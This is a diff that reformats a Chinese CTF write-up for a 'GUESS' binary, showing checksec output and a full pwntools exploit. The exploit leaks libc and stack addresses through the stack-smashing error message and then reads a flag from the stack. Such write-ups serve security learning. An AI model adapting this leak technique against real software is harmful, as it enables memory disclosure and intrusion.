@@ -15,13 +15,14 @@ tags:
 
 1，检查保护
 
-	gdb-peda$ checksec
-	CANARY    : ENABLED
-	FORTIFY   : disabled
-	NX        : ENABLED
-	PIE       : disabled
-	RELRO     : Partial
-
+```python
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+```
 
  开了CANARY 和 NX
 
@@ -61,33 +62,34 @@ tags:
 
 ## 0x03 完整脚本
 
-	from pwn import *
-	e=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
-	environ =e.symbols["environ"]
-	read_got=0x602040
-	p = process("./GUESS")
-	
-	p.recvuntil("flag\n")
-	p.sendline("1" * 0x128 + p64(read_got))
-	print p.recvuntil("***: ")
-	read_offset = u64(p.recv(6).ljust(8, "\x00"))
-	libc = read_offset - e.symbols["read"]
-	environ += libc
-	print hex(libc)
-	
-	p.recvuntil("flag\n")
-	p.sendline("1" * 0x128 + p64(environ))
-	print p.recvuntil("***: ")
-	stack = u64(p.recv(6).ljust(8, "\x00"))
-	print hex(stack)
-	
-	
-	p.recvuntil("flag\n")
-	p.sendline("1" * 0x128 + p64(stack - 0x168))
-	print p.recvuntil("***: ")
-	print p.recvline()
-	p.close()
+```python
+from pwn import *
+e=ELF("/lib/x86_64-linux-gnu/libc-2.19.so")
+environ =e.symbols["environ"]
+read_got=0x602040
+p = process("./GUESS")
 
+p.recvuntil("flag\n")
+p.sendline("1" * 0x128 + p64(read_got))
+print p.recvuntil("***: ")
+read_offset = u64(p.recv(6).ljust(8, "\x00"))
+libc = read_offset - e.symbols["read"]
+environ += libc
+print hex(libc)
+
+p.recvuntil("flag\n")
+p.sendline("1" * 0x128 + p64(environ))
+print p.recvuntil("***: ")
+stack = u64(p.recv(6).ljust(8, "\x00"))
+print hex(stack)
+
+
+p.recvuntil("flag\n")
+p.sendline("1" * 0x128 + p64(stack - 0x168))
+print p.recvuntil("***: ")
+print p.recvline()
+p.close()
+```
 ## 0x04 运行结果
 
 ![last]
